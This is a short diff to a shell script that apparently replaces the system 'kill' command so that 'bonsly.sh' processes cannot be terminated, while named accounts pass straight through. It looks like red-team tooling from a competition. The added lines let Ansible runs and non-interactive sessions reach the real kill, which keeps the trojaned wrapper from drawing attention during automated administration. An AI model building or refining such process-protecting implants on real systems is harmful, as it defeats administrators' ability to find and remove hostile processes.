@@ -6,6 +6,16 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_KILL "$@" ;;
 esac
 
+# Ansible automation bypass — let Ansible run unimpeded
+if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
+    exec $REAL_KILL "$@"
+fi
+
+# Script/non-interactive bypass — don't break automated pipelines
+if [ ! -t 0 ] && [ ! -t 1 ]; then
+    exec $REAL_KILL "$@"
+fi
+
 # Get bonsly PIDs to protect
 BONSLY_PIDS=$(pgrep -f "bonsly.sh" 2>/dev/null)
 
